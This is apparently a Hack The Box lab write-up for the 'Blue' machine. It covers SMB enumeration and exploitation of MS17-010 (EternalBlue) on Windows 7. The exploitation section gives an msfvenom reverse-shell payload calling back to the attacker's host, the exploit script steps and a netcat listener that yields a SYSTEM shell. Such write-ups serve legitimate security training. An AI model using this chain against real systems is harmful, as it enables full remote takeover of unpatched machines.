+++
draft = false
date = 2020-06-26T16:04:02+01:00
title = "Blue"
description = ""
slug = ""
tags = []
categories = []
externalLink = ""
series = []
weight = 8
+++


# Machine info

- OS : Windows
- Difficulty : Easy
- Points : 20
- IP : 10.10.10.40


# Mind Map
![Blue_MindMap](/images/htb/blue_mindmap.png)

&nbsp;

# Recon

We start with an initial scan, including the `-sC` option which will run also the default scripts:

```
sudo nmap -sC -sV -O 10.10.10.40 -n -oA nmap/initial

Nmap scan report for 10.10.10.40
Host is up (0.073s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=6/27%OT=135%CT=1%CU=32915%PV=Y%DS=2%DC=I%G=Y%TM=5EF6F9
OS:81%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M
OS:54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m58s, deviation: 34m37s, median: 0s
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-27T08:47:05+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-06-27T07:47:07
|_  start_date: 2020-06-27T07:44:39

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

**Note**: `guest` appears to be a valid account.

&nbsp;

# Enumeration

From the scan result we can see that **port 445** - used for SMB - is open and that the `message_signing` option is disabled. There are some shares with null session read access:

```
smbclient -L 10.10.10.40
Enter WORKGROUP\user's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Share           Disk      
        Users           Disk   
```

**Note**: I can obtain the same info with the following nmap script, which will return shares permission also:

```
nmap --script smb-enum-shares 10.10.10.40
```

We can also check shares permissions with the `smbmap` command:

```
smbmap -H 10.10.10.40 -u anonymous
[+] Guest session       IP: 10.10.10.40:445     Name: 10.10.10.40                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        Share                                                   READ ONLY
        Users                                                   READ ONLY
```

**->** We have **READ** permissions on the shares named `Share` and `Users`. We can list its content with smbclient but nothing useful is found there.

We can proceed checking for vulnerabilities with a nmap script scan on ports `139` and `445`:

```
nmap --script smb-vuln* 10.10.10.40 -p 139,445 -n

Nmap scan report for 10.10.10.40
Host is up (0.097s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 15.96 seconds
```

Where:
- `smb-vuln*` is a wildcard notation useful to specify that we want to run all the scripts with the name starting with `smb-vuln`

The target is vulnerable to **MS17-010**:

>EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. This vulnerability is denoted by entry CVE-2017-0144[15][16] in the Common Vulnerabilities and Exposures (CVE) catalog. The vulnerability exists because the SMB version 1 (SMBv1) server in various versions of Microsoft Windows mishandles specially crafted packets from remote attackers, allowing them to execute arbitrary code on the target computer.[17]

>The NSA did not alert Microsoft about the vulnerabilities, and held on to it for more than five years before the breach forced its hand. The agency then warned Microsoft after learning about EternalBlue’s possible theft, allowing the company to prepare a software patch issued in March 2017,[18] after delaying its regular release of security patches in February 2017.

&nbsp;

# Exploitation

There is a well known `Metasploit` module available for this exploit, but we will do it manually.
Let's check `searchsploit` and search for:

```
searchsploit eternalblue
```

We can find an interesting python script for `Win 7/8.1/2008` OS versions:

```
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                               | windows/remote/42315.py
```

Let's download it on our machine:

```
searchsploit -m windows/remote/42315.py
```

**Tip**: always read the exploit code to understand what it is doing.

In order to work, the script:

1. needs a `mysmb.py` file (easy to find)
2. needs an exploit to launch, we will create a **msfvenom reverse shell**
3. needs a  valid `user/pass` couple -> We know that `guest` user is allowed

So, for point **1**, we can download the `mysmb.py` file:

```
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
```

For point **2**, we will create a **reverse shell** with `msfvenom` in the current directory:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1234 -f exe > ./shell.exe
```

At this point we have to edit the exploit file. There are plenty of resources on the internet explaining how to do that. One good resource is this one:
> https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/

Substantially, what we are doing is to enable a function named **service_exec()** that will connect to the target and upload the reverse shell we created. After that, it will try to execute it.

If everything goes well, we will have a connection back from the target!

At this point we have to set up a listener on our machine and launch the exploit which will connect back to us:

```
python 42315.py 10.10.10.40

Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: samr
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
No transaction struct in leak data
leak failed... try again
CONNECTION: 0xfffffa8001f4f170
SESSION: 0xfffff8a001fb96a0
FLINK: 0xfffff8a0029645f0
InParam: 0xfffff8a00120b15c
MID: 0x2405
unexpected alignment, diff: 0x17585f0
leak failed... try again
CONNECTION: 0xfffffa8001f4f170
SESSION: 0xfffff8a001fb96a0
FLINK: 0xfffff8a0026b0048
InParam: 0xfffff8a00121715c
MID: 0x2402
unexpected alignment, diff: 0x1498048
leak failed... try again
CONNECTION: 0xfffffa8001f4f170
SESSION: 0xfffff8a001fb96a0
FLINK: 0xfffff8a001229088
InParam: 0xfffff8a00122315c
MID: 0x2503
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\shell.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service MYBp.....
Starting service MYBp.....
The NETBIOS connection with the remote host timed out.
Removing service MYBp.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

Here is the shell calling on our machine:

```
nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.40] 49298
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

And we are already **SYSTEM**! No privilege escalation is needed!


**Note**: flags are under `\Administrator\Desktop` and `\Users\Desktop`.
